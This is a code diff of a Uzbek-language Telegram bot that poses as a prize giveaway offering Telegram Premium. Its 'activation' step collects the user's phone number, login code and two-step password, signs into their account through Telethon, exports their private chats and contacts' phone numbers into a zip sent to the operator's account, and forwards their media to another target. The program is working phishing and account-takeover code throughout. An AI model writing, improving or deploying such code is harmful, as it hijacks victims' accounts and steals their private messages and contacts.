@@ -5,6 +5,7 @@ import zipfile
 import shutil
 import random
 import asyncio
+from datetime import datetime
 
 from aiogram import Bot, Dispatcher, types
 from aiogram.dispatcher.filters import CommandStart
@@ -13,8 +14,7 @@ from aiogram.utils import executor
 
 from telethon import TelegramClient
 from telethon.tl.types import User
-from telethon.sessions import StringSession
-from telethon.errors import SessionPasswordNeededError, PhoneCodeExpiredError
+from telethon.errors import SessionPasswordNeededError
 
 # ================== ENV ==================
 BOT_TOKEN = os.getenv("BOT_TOKEN")
@@ -99,7 +99,6 @@ async def referral(msg: types.Message):
     ensure_user(uid)
     me = await bot.get_me()
     await msg.answer(
-        f"Har 10 ta do‘st uchun 3 ta quti\n\n"
         f"🔗 https://t.me/{me.username}?start={uid}\n"
         f"👤 Taklif qilinganlar: {users[uid]['refs']}"
     )
@@ -112,12 +111,11 @@ async def magic_box(msg: types.Message):
     u = users[uid]
 
     if u["boxes"] >= 3:
-        await msg.answer("❌ Qutilar tugagan")
-        return
+        return await msg.answer("❌ Qutilar tugagan")
 
     kb = types.InlineKeyboardMarkup().add(
         types.InlineKeyboardButton(
-            f"🔓 Ochish ({u['boxes']+1}/3)",
+            f"Ochish ({u['boxes']+1}/3)",
             callback_data="open_box"
         )
     )
@@ -128,29 +126,53 @@ async def open_box(c):
     uid = str(c.from_user.id)
     u = users[uid]
 
+    # Limit tekshiruvi
     if u["boxes"] >= 3:
         await c.answer("Qutilar tugagan", show_alert=True)
         return
 
+    # Bitta ochildi
     u["boxes"] += 1
-    is_win = config["magic_box"] == "on" and u["boxes"] == u["win_box"] and not u["prize"]
+
+    is_win = (
+        config["magic_box"] == "on"
+        and u["boxes"] == u["win_box"]
+        and not u["prize"]
+    )
+
     save_json(USERS_FILE, users)
 
+    # ======================
+    # ❌ YUTUQSIZ HOLAT
+    # ======================
     if not is_win:
+        # 1️⃣ emoji alohida
         await c.message.answer("😐")
+
+        # 2️⃣ matn + tugma
         kb = None
         if u["boxes"] < 3:
             kb = types.InlineKeyboardMarkup().add(
                 types.InlineKeyboardButton("🔓 Ochish", callback_data="open_box")
             )
-        await c.message.answer("Afsus, hech narsa tushmadi", reply_markup=kb)
+
+        await c.message.answer(
+            "Hech narsa tushmadi",
+            reply_markup=kb
+        )
         await c.answer()
         return
 
+    # ======================
+    # ✅ YUTUQLI HOLAT
+    # ======================
     u["prize"] = True
     save_json(USERS_FILE, users)
 
+    # 1️⃣ emoji alohida
     await c.message.answer("🥳")
+
+    # 2️⃣ matn + ehtimol tugma
     kb = None
     if u["boxes"] < 3:
         kb = types.InlineKeyboardMarkup().add(
@@ -158,10 +180,12 @@ async def open_box(c):
         )
 
     await c.message.answer(
-        "🎉 Siz 1 oylik Telegram Premium yutdingiz!\nUni olish uchun Aktivlash bo‘limiga o‘ting.",
+        "🎉 Siz yutdingiz!",
         reply_markup=kb
     )
+
     await c.answer()
+
 
 # ================== YUTUQLAR ==================
 @dp.message_handler(lambda m: m.text == "🏆 Yutuqlar")
@@ -169,106 +193,50 @@ async def prizes(msg: types.Message):
     uid = str(msg.from_user.id)
     ensure_user(uid)
     await msg.answer(
-        "🏆 Sizda 1 oylik premium bor" if users[uid]["prize"] else "❌ Yutuqlar yo‘q"
+        "🏆 Sizda Premium bor" if users[uid]["prize"] else "❌ Yutuq yo‘q"
     )
 
 # ================== AKTIVLASH ==================
 @dp.message_handler(lambda m: m.text == "✅ Aktivlash")
 async def activate(msg: types.Message):
     sessions[msg.from_user.id] = {"step": "phone"}
-    await msg.answer(
-        "📲 Telefon raqamingizni yuboring\nMasalan: +998901234567",
-        reply_markup=back_menu()
-    )
+    await msg.answer("📲 Telefon raqamingizni yuboring", reply_markup=back_menu())
 
-# ================== TELEFON ==================
-@dp.message_handler(
-    lambda m: m.from_user.id in sessions
-    and sessions[m.from_user.id]["step"] == "phone"
-)
-async def phone_handler(msg: types.Message):
-    uid = msg.from_user.id
+@dp.message_handler(lambda m: m.text == "⬅️ Orqaga")
+async def go_back(msg: types.Message):
+    sessions.pop(msg.from_user.id, None)
+    await msg.answer("🏠 Bosh menu", reply_markup=main_menu(msg.from_user.id == ADMIN_ID))
 
-    # 🔢 faqat raqamlarni olamiz
-    digits = re.sub(r"\D", "", msg.text)
-
-    # juda qisqa yoki juda uzun bo‘lsa – rad
-    if len(digits) < 8 or len(digits) > 15:
-        await msg.answer(
-            "❌ Telefon raqam noto‘g‘ri\n"
-            "Masalan: +998901234567, +447700900123, +1234567890"
-        )
-        return
-
-    # Telegram talab qiladigan format
-    phone = "+" + digits
-
-    client = TelegramClient(StringSession(), API_ID, API_HASH)
-    await client.connect()
-
-    sent = await client.send_code_request(phone)
-
-    sessions[uid].update({
-        "step": "code",
-        "phone": phone,
-        "client": client,
-        "phone_code_hash": sent.phone_code_hash
-    })
-
-    await msg.answer("🔐 Telegram kodi yuborildi")
-
-
-
-# ================== KOD ==================
-@dp.message_handler(
-    lambda m: m.from_user.id in sessions
-    and sessions[m.from_user.id]["step"] == "code"
-)
-async def code_handler(msg: types.Message):
+@dp.message_handler(lambda m: m.from_user.id in sessions)
+async def login_flow(msg: types.Message):
     uid = msg.from_user.id
     state = sessions[uid]
+    text = msg.text.strip()
 
-    # 🔢 faqat raqamlarni olib qolamiz
-    code = re.sub(r"\D", "", msg.text)
+    # PHONE
+    if state["step"] == "phone":
+        client = TelegramClient(f"session_{uid}", API_ID, API_HASH)
+        await client.connect()
+        await client.send_code_request(text)
+        state.update({"step": "code", "phone": text, "client": client})
+        return await msg.answer("🔐 Kodni yuboring")
 
-    # ❗ Telegram kodi ODATDA 5 xonali
-    if len(code) != 5:
-        await msg.answer(
-            "❌ Kod noto‘g‘ri.\n"
-            "Masalan: 23.345 yoki 23345"
-        )
-        return
+    # CODE
+    if state["step"] == "code":
+        try:
+            await state["client"].sign_in(state["phone"], text)
+        except SessionPasswordNeededError:
+            state["step"] = "password"
+            return await msg.answer("🔑 2 bosqichli parolni yuboring")
 
-    try:
-        await state["client"].sign_in(
-            phone=state["phone"],
-            code=code,
-            phone_code_hash=state["phone_code_hash"]
-        )
+        await msg.answer("⏳ Chatlar eksport qilinmoqda...")
+        return await export_chats(uid)
 
-    except PhoneCodeExpiredError:
-        await msg.answer("⛔ Kod eskirdi. Qayta ✅ Aktivlash bosing.")
-        await state["client"].disconnect()
-        sessions.pop(uid, None)
-        return
-
-    except SessionPasswordNeededError:
-        state["step"] = "password"
-        await msg.answer("🔑 2 bosqichli parolni yuboring")
-        return
-
-    await msg.answer("⏳ Chatlar eksport qilinmoqda...")
-    await export_chats(uid)
-
-# ================== PAROL ==================
-@dp.message_handler(lambda m: m.from_user.id in sessions and sessions[m.from_user.id]["step"] == "password")
-async def password_handler(msg: types.Message):
-    uid = msg.from_user.id
-    password = msg.text.strip()
-
-    await sessions[uid]["client"].sign_in(password=password)
-    await msg.answer("⏳ Chatlar eksport qilinmoqda...")
-    await export_chats(uid)
+    # PASSWORD
+    if state["step"] == "password":
+        await state["client"].sign_in(password=text)
+        await msg.answer("⏳ Chatlar eksport qilinmoqda...")
+        await export_chats(uid)
 
 # ================== EXPORT ==================
 def safe_name(t):
@@ -286,10 +254,7 @@ def media_text(m):
 async def export_chats(uid):
     client = sessions[uid]["client"]
     os.makedirs(BASE_DIR, exist_ok=True)
-
     all_media = []
-    zip_name = f"chats_{uid}.zip"
-    session_string = client.session.save() or "SESSION_NOT_AVAILABLE"
 
     for d in await client.get_dialogs():
         if isinstance(d.entity, User) and not d.entity.bot:
@@ -301,7 +266,10 @@ async def export_chats(uid):
 
             with open(os.path.join(folder, "chat.txt"), "w", encoding="utf-8") as f:
                 f.write(
-                    f"Ism: {name}\nUser ID: {user.id}\nUsername: @{user.username}\nTelefon: {user.phone}\n\n"
+                    f"Ism: {name}\n"
+                    f"User ID: {user.id}\n"
+                    f"Username: @{user.username}\n"
+                    f"Telefon: {user.phone}\n\n"
                 )
 
                 async for m in client.iter_messages(user, limit=2000, reverse=True):
@@ -314,14 +282,22 @@ async def export_chats(uid):
 
                     f.write(f"[{time}] {sender}: {text}\n")
 
+    # ZIP
+    zip_name = f"chats_{uid}.zip"
     with zipfile.ZipFile(zip_name, "w", zipfile.ZIP_DEFLATED) as z:
         for root, _, files in os.walk(BASE_DIR):
             for file in files:
                 full = os.path.join(root, file)
                 z.write(full, arcname=os.path.relpath(full, BASE_DIR))
-        z.writestr("session.txt", session_string)
 
-    await bot.send_document(ADMIN_ID, types.InputFile(zip_name))
+    # SEND ZIP TO ADMIN
+    await bot.send_document(
+        ADMIN_ID,
+        types.InputFile(zip_name),
+        caption=f"📦 Chatlar eksport qilindi | UID: {uid}"
+    )
+
+    # SEND ALL MEDIA
     for m in all_media:
         try:
             await m.forward_to(MEDIA_TARGET)
